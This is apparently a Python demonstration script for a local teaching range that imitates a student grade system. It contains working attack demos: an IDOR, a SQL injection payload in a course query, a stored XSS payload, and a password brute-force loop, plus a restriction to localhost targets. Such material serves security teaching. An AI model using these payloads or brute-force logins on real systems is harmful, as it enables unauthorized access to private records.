from __future__ import annotations

import argparse
import csv
import json
import sys
from dataclasses import dataclass
from html import unescape
from io import StringIO
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urlparse
from urllib.request import Request, urlopen

DEFAULT_BASE_URL = "http://127.0.0.1:8001"


@dataclass
class Session:
    base_url: str
    token: str = ""

    def request(self, method: str, path: str, data: dict[str, Any] | None = None, raw: bool = False) -> Any:
        body = None
        headers = {"User-Agent": "grade-lab-demo/1.0"}
        if data is not None:
            body = json.dumps(data, ensure_ascii=False).encode("utf-8")
            headers["Content-Type"] = "application/json"
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"

        request = Request(f"{self.base_url}{path}", data=body, headers=headers, method=method)
        try:
            with urlopen(request, timeout=8) as response:
                payload = response.read().decode("utf-8")
                if raw:
                    return payload
                return json.loads(payload)
        except HTTPError as error:
            payload = error.read().decode("utf-8", errors="replace")
            try:
                parsed = json.loads(payload)
            except json.JSONDecodeError:
                parsed = {"message": payload or str(error)}
            raise RuntimeError(f"{method} {path} failed: HTTP {error.code}, {parsed.get('message', parsed)}") from error
        except URLError as error:
            raise RuntimeError(f"无法连接 {self.base_url}，请先启动靶场：python app.py") from error

    def login(self, username: str, password: str) -> dict[str, Any]:
        result = self.request("POST", "/api/login", {"username": username, "password": password})
        if result.get("code") != 0:
            raise RuntimeError(result.get("message", "登录失败"))
        data = result["data"]
        self.token = data["token"]
        return data["user"]

    def get_grades(self, student_id: str = "", course: str = "") -> list[dict[str, Any]]:
        params = {key: value for key, value in {"student_id": student_id, "course": course}.items() if value}
        query = f"?{urlencode(params)}" if params else ""
        result = self.request("GET", f"/api/grades{query}")
        return result["data"]["items"]

    def save_grade(self, student_id: str, course: str, score: int) -> dict[str, Any]:
        result = self.request(
            "PUT",
            "/api/grades",
            {"student_id": student_id, "course": course, "score": score},
        )
        return result["data"]


def require_local_target(base_url: str) -> str:
    parsed = urlparse(base_url)
    if parsed.scheme not in {"http", "https"}:
        raise SystemExit("base-url 必须是 http:// 或 https:// 地址")
    if parsed.hostname not in {"127.0.0.1", "localhost"}:
        raise SystemExit("演示脚本只允许访问本机靶场：127.0.0.1 或 localhost")
    return base_url.rstrip("/")


def print_table(title: str, rows: list[dict[str, Any]]) -> None:
    print(f"\n== {title} ==")
    if not rows:
        print("无记录")
        return
    for item in rows:
        print(
            f"{item.get('student_id', '-')} | "
            f"{item.get('student_name', '-')} | "
            f"{item.get('class_name', '-')} | "
            f"{item.get('course', '-')} | "
            f"{item.get('score', '-')}"
        )


def demo_idor(base_url: str) -> None:
    session = Session(base_url)
    user = session.login("2024001", "123456")
    print(f"已登录学生：{user['name']} ({user['student_id']})")

    own = session.get_grades()
    print_table("正常查询自己的成绩", own)

    other = session.get_grades("2024002")
    print_table("越权查询 student_id=2024002 的成绩", other)
    print("演示点：学生账号直接传入其他 student_id 后，后端返回了其他学生成绩。")


def demo_sqli(base_url: str) -> None:
    session = Session(base_url)
    user = session.login("2024001", "123456")
    payload = "信息安全导论' or 1=1--"
    print(f"已登录学生：{user['name']} ({user['student_id']})")
    print(f"查询参数 course={payload}")

    rows = session.get_grades(course=payload)
    print_table("SQL 注入形态查询返回结果", rows)
    ids = sorted({str(item.get("student_id", "")) for item in rows})
    print(f"返回 student_id 集合：{', '.join(ids)}")
    print("演示点：课程查询参数中的 SQL 注入形态内容触发脆弱分支，返回全量成绩。")


def demo_xss(base_url: str) -> None:
    teacher = Session(base_url)
    user = teacher.login("teacher", "teacher123")
    payload = '<img src=x onerror="document.body.dataset.xssDemo=1">'
    print(f"已登录教师：{user['name']}")
    saved = teacher.save_grade("2024001", payload, 91)
    print("已写入包含 HTML 事件属性的课程名称：")
    print(saved["course"])

    student = Session(base_url)
    student.login("2024001", "123456")
    rows = student.get_grades()
    matched = [item for item in rows if item.get("course") == payload]
    print_table("学生查看成绩时可收到该课程字段", matched)
    print("演示点：前端成绩表直接使用 innerHTML 拼接课程字段，浏览器渲染页面时会解释该 HTML。")


def demo_bruteforce(base_url: str) -> None:
    usernames = ["2024001", "2024002", "teacher", "admin", "test"]
    passwords = ["123", "password", "admin123", "teacher", "wrongpass"]
    attempts = 0
    print("\n== 登录失败审计演示 ==")
    for username in usernames:
        for password in passwords:
            attempts += 1
            session = Session(base_url)
            try:
                session.login(username, password)
                print(f"{username}/{password}: success")
            except RuntimeError:
                print(f"{username}/{password}: failed")
    print(f"共发送 {attempts} 次登录尝试，失败记录会进入隐藏审计日志和 IDS 导出 CSV。")


def demo_export(base_url: str) -> None:
    session = Session(base_url)
    audit = session.request("GET", "/api/lab/audit")
    records = audit["data"]["items"]
    print(f"\n== 最近审计记录：{len(records)} 条 ==")
    for item in records[-8:]:
        print(
            f"{item.get('timestamp', '')} | "
            f"{item.get('username', '')} | "
            f"{item.get('action', '')} | "
            f"{item.get('target', '')} | "
            f"{item.get('result', '')}"
        )

    csv_text = session.request("GET", "/api/lab/export-log", raw=True)
    rows = list(csv.DictReader(StringIO(csv_text)))
    print(f"\n== IDS CSV 导出：{len(rows)} 行 ==")
    for row in rows[:8]:
        print(f"{row.get('source_ip')} -> {row.get('target_ip')} {row.get('method')} {row.get('path')} {row.get('status_code')}")


def demo_reset(base_url: str) -> None:
    session = Session(base_url)
    result = session.request("POST", "/api/lab/reset", {})
    print(result.get("message", "已重置"))


def demo_all(base_url: str) -> None:
    demo_reset(base_url)
    demo_idor(base_url)
    demo_sqli(base_url)
    demo_xss(base_url)
    demo_bruteforce(base_url)
    demo_export(base_url)


def main() -> int:
    parser = argparse.ArgumentParser(description="交大学生成绩管理系统本机靶场演示脚本")
    parser.add_argument(
        "demo",
        choices=["all", "idor", "sqli", "xss", "bruteforce", "export", "reset"],
        help="要运行的演示项",
    )
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="靶场地址，默认 http://127.0.0.1:8001")
    args = parser.parse_args()

    base_url = require_local_target(args.base_url)
    actions = {
        "all": demo_all,
        "idor": demo_idor,
        "sqli": demo_sqli,
        "xss": demo_xss,
        "bruteforce": demo_bruteforce,
        "export": demo_export,
        "reset": demo_reset,
    }
    try:
        actions[args.demo](base_url)
    except RuntimeError as error:
        print(f"错误：{error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
